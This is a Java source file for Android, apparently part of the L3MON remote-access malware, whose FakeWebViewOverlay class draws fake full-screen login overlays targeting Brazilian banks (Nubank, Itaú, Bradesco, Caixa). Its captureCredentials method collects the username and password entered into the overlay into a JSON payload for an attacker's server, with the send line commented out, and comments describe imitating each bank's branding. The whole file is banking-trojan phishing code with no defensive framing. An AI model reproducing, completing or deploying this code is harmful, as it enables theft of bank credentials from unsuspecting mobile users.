package com.etechd.l3mon.managers;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import org.json.JSONObject;

public class FakeWebViewOverlay {

    private final Context context;
    private final WindowManager windowManager;
    private View overlayView;
    private boolean isShowing = false;
    private String currentBank = "";

    public FakeWebViewOverlay(Context context) {
        this.context = context;
        this.windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
    }

    /**
     * Mostra overlay falso específico para cada banco
     */
    public void showFakeLoginOverlay(String bankName) {
        if (isShowing) {
            hideOverlay();
        }

        currentBank = bankName.toLowerCase();

        try {
            WindowManager.LayoutParams params = createOverlayParams();

            // Escolhe o layout de acordo com o banco
            overlayView = createBankSpecificLayout(bankName);

            if (overlayView != null) {
                windowManager.addView(overlayView, params);
                isShowing = true;
            }

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private WindowManager.LayoutParams createOverlayParams() {
        int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_PHONE;

        WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                        WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN |
                        WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT);

        params.gravity = Gravity.TOP | Gravity.START;
        return params;
    }

    /**
     * Cria layout diferente dependendo do banco
     */
    private View createBankSpecificLayout(String bankName) {
        View view = null;
        LayoutInflater inflater = LayoutInflater.from(context);

        switch (bankName.toLowerCase()) {
            case "nubank":
                view = createNubankFakeLayout(inflater);
                break;
            case "itau":
                view = createItauFakeLayout(inflater);
                break;
            case "bradesco":
                view = createBradescoFakeLayout(inflater);
                break;
            case "caixa":
                view = createCaixaFakeLayout(inflater);
                break;
            default:
                view = createGenericBankLayout(inflater, bankName);
                break;
        }

        setupCaptureListeners(view, bankName);
        return view;
    }

    // ==================== LAYOUTS POR BANCO ====================

    private View createNubankFakeLayout(LayoutInflater inflater) {
        // Idealmente usar um layout XML customizado que imite o Nubank
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);

        // Aqui você pode inflar um layout mais elaborado com:
        // - Logo do Nubank
        // - Campos de CPF + Senha
        // - Botão roxo característico

        return view;
    }

    private View createItauFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        // Layout com cores laranja do Itaú
        return view;
    }

    private View createBradescoFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        // Layout com cores vermelhas do Bradesco
        return view;
    }

    private View createCaixaFakeLayout(LayoutInflater inflater) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        return view;
    }

    private View createGenericBankLayout(LayoutInflater inflater, String bankName) {
        View view = inflater.inflate(android.R.layout.simple_list_item_1, null);
        // Layout genérico
        return view;
    }

    // ==================== CAPTURA DE DADOS ====================

    private void setupCaptureListeners(View view, String bankName) {
        if (view == null)
            return;

        // Exemplo: Capturar quando o usuário clicar em "Entrar"
        Button loginButton = view.findViewById(android.R.id.button1); // Ajuste conforme seu layout

        if (loginButton != null) {
            loginButton.setOnClickListener(v -> {
                captureCredentials(view, bankName);
                hideOverlay();
            });
        }
    }

    private void captureCredentials(View view, String bankName) {
        try {
            EditText usernameField = view.findViewById(android.R.id.text1); // Ajuste os IDs
            EditText passwordField = view.findViewById(android.R.id.text2);

            String username = usernameField != null ? usernameField.getText().toString() : "";
            String password = passwordField != null ? passwordField.getText().toString() : "";

            JSONObject capture = new JSONObject();
            capture.put("action", "fake_overlay_capture");
            capture.put("bank", bankName);
            capture.put("username", username);
            capture.put("password", password);
            capture.put("timestamp", System.currentTimeMillis());

            // Enviar para servidor
            // ConnectionManager.ioSocket.emit("0xWV", capture);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void hideOverlay() {
        if (overlayView != null && isShowing) {
            try {
                windowManager.removeView(overlayView);
            } catch (Exception ignored) {
            }
            isShowing = false;
            overlayView = null;
            currentBank = "";
        }
    }

    public boolean isShowing() {
        return isShowing;
    }

    public String getCurrentBank() {
        return currentBank;
    }
}